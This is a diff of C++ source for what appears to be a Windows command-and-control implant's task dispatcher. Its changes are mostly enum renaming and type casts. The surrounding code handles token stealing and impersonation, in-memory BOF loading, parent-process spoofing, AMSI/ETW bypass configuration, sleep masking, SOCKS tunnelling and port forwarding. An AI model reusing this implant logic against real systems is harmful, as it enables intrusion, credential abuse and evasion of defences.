@@ -21,7 +21,7 @@ auto DECLFN Task::Dispatcher( VOID ) -> VOID {
 
         Self->Jbs->Cleanup();
 
-        if ( DataPsr ) {
+        if ( DataPsr && Self->Hp->CheckPtr( DataPsr ) ) {
             hFree( DataPsr );
         }
 
@@ -71,7 +71,7 @@ auto DECLFN Task::Dispatcher( VOID ) -> VOID {
 
     JobID = Self->Psr->Byte( Parser );
 
-    if ( JobID == Enm::Task::GetTask ) {
+    if ( JobID == (BYTE)(Action::Task::GetTask) ) {
         KhDbg("Processing job ID: %d", JobID);
         TaskQtt = Self->Psr->Int32( Parser );
         KhDbg("Task quantity received: %d", TaskQtt);
@@ -131,10 +131,9 @@ auto DECLFN Task::ExecBof(
     KhDbg("bof id  : %d", BofCmdID);
     KhDbg("bof args: %p [%d bytes]", BofArgs, BofArgc);
 
-    Success = Self->Cf->Loader( BofBuff, BofLen, BofArgs, BofArgc, Job->UUID, BofCmdID );
+    Self->Pkg->Int32( Self->Pkg->Shared, BofCmdID );
 
-    G_PACKAGE = nullptr;
-    G_PARSER  = nullptr;
+    Success = Self->Cf->Loader( BofBuff, BofLen, BofArgs, BofArgc, Job->UUID, BofCmdID );
 
     if ( Success ) {
         return KhRetSuccess;
@@ -372,7 +371,7 @@ auto DECLFN Task::Download(
         KhDbg("Adding Process Downloads job");
         PARSER* TmpPsrDownload = nullptr;
         BYTE*   TmpBufDownload = (BYTE*)hAlloc( sizeof(UINT16) );
-        UINT16  CmdDownload    = (UINT16)Enm::Task::ProcessDownloads;
+        UINT16  CmdDownload    = (UINT16)Action::Task::ProcessDownloads;
         JOBS*   NewJobDownload = nullptr;
         // 4-byte big-endian length
         TmpBufDownload[0] = (CmdDownload     ) & 0xFF;
@@ -413,12 +412,12 @@ auto DECLFN Task::Upload(
     CHAR* FilePath = nullptr;
     INT8  Index    = -1;
 
-    ULONG UploadState = Self->Psr->Int32( Parser );
+    Action::Up UploadState = (Action::Up)Self->Psr->Int32( Parser );
 
     KhDbg("Upload state: %d", UploadState);
 
     switch ( UploadState ) {
-        case Enm::Up::Init: {
+        case Action::Up::Init: {
             FileID = Self->Psr->Str( Parser, 0 );
             KhDbg("file id: %s", FileID);
             for ( INT i = 0; i < 30; i++ ) {
@@ -456,7 +455,7 @@ auto DECLFN Task::Upload(
 
             break;
         }
-        case Enm::Up::Chunk: {
+        case Action::Up::Chunk: {
             FileID = Self->Psr->Str( Parser, 0 );
             KhDbg("file id: %s", FileID);
             if ( ! FileID ) {
@@ -589,14 +588,14 @@ auto DECLFN Task::Pivot(
 
     Self->Pkg->Byte( Package, SubCmd );    
 
-    switch ( SubCmd ) {
-        case Enm::Pivot::List: {
+    switch ( (Action::Pivot)SubCmd ) {
+        case Action::Pivot::List: {
 
         }
-        case Enm::Pivot::Link: {
+        case Action::Pivot::Link: {
 
         }
-        case Enm::Pivot::Unlink: {
+        case Action::Pivot::Unlink: {
 
         }
     }
@@ -617,10 +616,10 @@ auto DECLFN Task::Config(
     KhDbg( "config count: %d", ConfigCount );
 
     for ( INT i = 0; i < ConfigCount; i++ ) {
-        UINT8 ConfigID = Self->Psr->Int32( Parser );
+        Action::Config ConfigID = (Action::Config)Self->Psr->Int32( Parser );
         KhDbg( "config id: %d", ConfigID );
         switch ( ConfigID ) {
-            case Enm::Config::Ppid: {
+            case Action::Config::Ppid: {
                 ULONG ParentID = Self->Psr->Int32( Parser );
                 Self->Config.Ps.ParentID = ParentID;
 
@@ -628,7 +627,7 @@ auto DECLFN Task::Config(
                 
                 break;
             }
-            case Enm::Config::Sleep: {
+            case Action::Config::Sleep: {
                 ULONG NewSleep = Self->Psr->Int32( Parser );
                 Self->Config.SleepTime = NewSleep * 1000;
 
@@ -636,7 +635,7 @@ auto DECLFN Task::Config(
                 
                 break;
             }
-            case Enm::Config::Jitter: {
+            case Action::Config::Jitter: {
                 ULONG NewJitter = Self->Psr->Int32( Parser );
                 Self->Config.Jitter = NewJitter;
 
@@ -644,7 +643,7 @@ auto DECLFN Task::Config(
                 
                 break;
             }
-            case Enm::Config::BlockDlls: {
+            case Action::Config::BlockDlls: {
                 BOOL BlockDlls  = Self->Psr->Int32( Parser );
                 Self->Config.Ps.BlockDlls = BlockDlls;
                 
@@ -652,7 +651,7 @@ auto DECLFN Task::Config(
                 
                 break;
             }
-            case Enm::Config::Mask: {
+            case Action::Config::Mask: {
                 INT32 TechniqueID = Self->Psr->Int32( Parser );
                 if ( 
                     TechniqueID != eMask::Timer &&
@@ -672,7 +671,7 @@ auto DECLFN Task::Config(
 
                 break;
             }
-            case Enm::Config::HeapObf: {
+            case Action::Config::HeapObf: {
                 BOOL HeapObf = Self->Psr->Int32( Parser );
 
                 Self->Config.Mask.Heap = HeapObf;
@@ -680,7 +679,7 @@ auto DECLFN Task::Config(
                 KhDbg("Heap Obfuscate is %s", HeapObf ? "enabled" : "disabled");
                 break;
             }
-            case Enm::Config::Spawn: {
+            case Action::Config::Spawn: {
                 WCHAR* Spawnto = Self->Psr->Wstr( Parser, 0 );
                 
                 Self->Config.Postex.Spawnto = Spawnto;
@@ -689,7 +688,7 @@ auto DECLFN Task::Config(
 
                 break;
             }
-            case Enm::Config::Killdate: {
+            case Action::Config::Killdate: {
                 SYSTEMTIME LocalTime { 0 };
 
                 INT16 Year  = (INT16)Self->Psr->Int32( Parser );
@@ -708,7 +707,7 @@ auto DECLFN Task::Config(
 
                 break;
             }
-            case Enm::Config::KilldateExit: {
+            case Action::Config::KilldateExit: {
                 BOOL KdExitProc = Self->Psr->Int32( Parser );
                 
                 Self->Config.KillDate.ExitProc = KdExitProc;
@@ -717,7 +716,7 @@ auto DECLFN Task::Config(
 
                 break;
             }
-            case Enm::Config::KilldateSelfdel: {
+            case Action::Config::KilldateSelfdel: {
                 BOOL KdSelfdel = Self->Psr->Int32( Parser );
 
                 Self->Config.KillDate.SelfDelete = KdSelfdel;
@@ -726,7 +725,7 @@ auto DECLFN Task::Config(
 
                 break;
             }
-            case Enm::Config::AmsiEtwBypass: {
+            case Action::Config::AmsiEtwBypass: {
                 ULONG AmsiEtwBypass = Self->Psr->Int32( Parser );
 
                 Self->Config.AmsiEtwBypass = AmsiEtwBypass;
@@ -735,7 +734,7 @@ auto DECLFN Task::Config(
 
                 break;
             }
-            case Enm::Config::Worktime: {
+            case Action::Config::Worktime: {
                 INT16 HrStart = (INT16)Self->Psr->Int32( Parser );
                 INT16 MnStart = (INT16)Self->Psr->Int32( Parser );
                 INT16 HrEnd   = (INT16)Self->Psr->Int32( Parser );
@@ -754,7 +753,7 @@ auto DECLFN Task::Config(
 
                 break;
             }
-            case Enm::Config::Syscall: {
+            case Action::Config::Syscall: {
                 INT32 Syscall = Self->Psr->Int32( Parser );
 
                 Self->Config.Syscall = Syscall;
@@ -763,7 +762,7 @@ auto DECLFN Task::Config(
 
                 break;
             }
-            case Enm::Config::ForkPipeName: {
+            case Action::Config::ForkPipeName: {
                 CHAR* ForkPipeName = Self->Psr->Str( Parser, nullptr );
 
                 Self->Config.Postex.ForkPipe = ForkPipeName;
@@ -772,7 +771,7 @@ auto DECLFN Task::Config(
 
                 break;
             }
-            case Enm::Config::BofApiProxy: {
+            case Action::Config::BofApiProxy: {
                 BOOL BofApiProxy = Self->Psr->Int32( Parser );
 
                 Self->Config.BofProxy = BofApiProxy;
@@ -781,7 +780,7 @@ auto DECLFN Task::Config(
 
                 break;
             }
-            case Enm::Config::Argue: {
+            case Action::Config::Argue: {
                 ULONG  ArgLen = 0;
                 WCHAR* Argue  = Self->Psr->Wstr( Parser, &ArgLen );
 
@@ -803,13 +802,13 @@ auto DECLFN Task::Token(
     PACKAGE* Package = Job->Pkg;
     PARSER*  Parser  = Job->Psr;
 
-    UINT8 SubID = Self->Psr->Int32( Parser );
+    Action::Token SubID = (Action::Token)Self->Psr->Int32( Parser );
 
-    Self->Pkg->Byte( Package, SubID );
+    Self->Pkg->Byte( Package, (BYTE)SubID );
     KhDbg( "Sub Command ID: %d", SubID );
 
     switch ( SubID ) {
-        case Enm::Token::GetUUID: {
+        case Action::Token::GetUUID: {
             CHAR*  ThreadUser  = nullptr;
             HANDLE TokenHandle = nullptr;
 
@@ -833,7 +832,7 @@ auto DECLFN Task::Token(
 
             break;
         }
-        case Enm::Token::List_t: {
+        case Action::Token::List: {
             TOKEN_NODE* Current = Self->Tkn->Node;
             ULONG count = 0;
 
@@ -857,7 +856,7 @@ auto DECLFN Task::Token(
             
             break;
         }
-        case Enm::Token::Steal: {            
+        case Action::Token::Steal: {            
             ULONG ProcessID = Self->Psr->Int32( Parser );
             BOOL  TokenUse  = Self->Psr->Int32( Parser );
 
@@ -895,7 +894,7 @@ auto DECLFN Task::Token(
 
             break;
         }
-        case Enm::Token::Impersonate: {            
+        case Action::Token::Impersonate: {            
             ULONG TokenID = Self->Psr->Int32( Parser );
             KhDbg("Impersonating Token ID: %d", TokenID);
 
@@ -908,7 +907,7 @@ auto DECLFN Task::Token(
             
             break;
         }
-        case Enm::Token::Remove_t: {            
+        case Action::Token::Remove: {            
             ULONG TokenID = Self->Psr->Int32( Parser );
             BOOL  result  = Self->Tkn->Rm( TokenID );
             
@@ -916,13 +915,13 @@ auto DECLFN Task::Token(
             
             break;
         }
-        case Enm::Token::Revert: {            
+        case Action::Token::Revert: {            
             BOOL result = Self->Tkn->Rev2Self();
             Self->Pkg->Int32( Package, result );
             
             break;
         }
-        case Enm::Token::Make: {
+        case Action::Token::Make: {
             KhDbg("[Task::Token] Comando: Make");
             
             CHAR*  UserName    = Self->Psr->Str( Parser, 0 );
@@ -980,7 +979,7 @@ auto DECLFN Task::Token(
 
             break;
         }
-        case Enm::Token::GetPriv: {            
+        case Action::Token::GetPriv: {            
             HANDLE TokenHandle = Self->Tkn->CurrentPs();
             
             if ( !TokenHandle || TokenHandle == INVALID_HANDLE_VALUE ) {
@@ -996,7 +995,7 @@ auto DECLFN Task::Token(
 
             break;
         }
-        case Enm::Token::LsPriv: {
+        case Action::Token::LsPriv: {
             ULONG       PrivListLen = 0;
             PRIV_LIST** PrivList    = nullptr;
             HANDLE      TokenHandle = Self->Tkn->CurrentPs();
@@ -1464,7 +1463,7 @@ auto DECLFN Task::Socks(
 
                                 PARSER* TmpPsrDownload = nullptr;
                                 PBYTE   TmpBufDownload = (BYTE*)hAlloc( sizeof(UINT16) );
-                                UINT16  CmdDownload    = (UINT16)Enm::Task::ProcessTunnels;
+                                UINT16  CmdDownload    = (UINT16)Action::Task::ProcessTunnels;
                                 JOBS*   NewJobDownload = nullptr;
 
                                 // 4-byte big-endian length
@@ -1649,7 +1648,7 @@ auto Task::RPortfwd(
                         KhDbg("Adding Process Tunnel job\n");
                         PARSER* TmpPsrDownload = nullptr;
                         PBYTE   TmpBufDownload = (BYTE*)hAlloc( sizeof(UINT16) );
-                        UINT16  CmdDownload    = (UINT16)Enm::Task::ProcessTunnels;
+                        UINT16  CmdDownload    = (UINT16)Action::Task::ProcessTunnels;
                         JOBS*   NewJobDownload = nullptr;
                         // 4-byte big-endian length
                         TmpBufDownload[0] = (CmdDownload     ) & 0xFF;
@@ -1710,10 +1709,10 @@ auto DECLFN Task::Jobs(
     auto Package = Job->Pkg;
     auto Parser  = Job->Psr;
 
-    ULONG JobSubId = Self->Psr->Int32( Parser );
+    Action::Job JobSubId = (Action::Job)Self->Psr->Int32( Parser );
 
     switch ( JobSubId ) {
-    case Enm::Job::List_j: {
+    case Action::Job::List: {
         JOBS* Current = Self->Jbs->List;
 
         Self->Pkg->Int32( Package, Self->Jbs->Count );
@@ -1726,7 +1725,7 @@ auto DECLFN Task::Jobs(
             Current = Current->Next;
         }
     }
-    case Enm::Job::Remove: {
+    case Action::Job::Remove: {
         // todo
     }
     }
@@ -1737,7 +1736,7 @@ auto DECLFN Task::Jobs(
 auto DECLFN Task::Exit(
     _In_ JOBS* Job
 ) -> ERROR_CODE {
-    INT8 ExitType = Self->Psr->Byte( Job->Psr );
+    Action::Exit ExitType = (Action::Exit)Self->Psr->Byte( Job->Psr );
 
     Job->State    = KH_JOB_READY_SEND;
     Job->ExitCode = EXIT_SUCCESS;
@@ -1747,9 +1746,9 @@ auto DECLFN Task::Exit(
 
     Self->Hp->Clean();
 
-    if ( ExitType == Enm::Exit::Proc ) {
+    if ( ExitType == Action::Exit::Proc ) {
         Self->Ntdll.RtlExitUserProcess( EXIT_SUCCESS );
-    } else if ( ExitType == Enm::Exit::Thread ) {
+    } else if ( ExitType == Action::Exit::Thread ) {
         Self->Ntdll.RtlExitUserThread( EXIT_SUCCESS );
     }
 
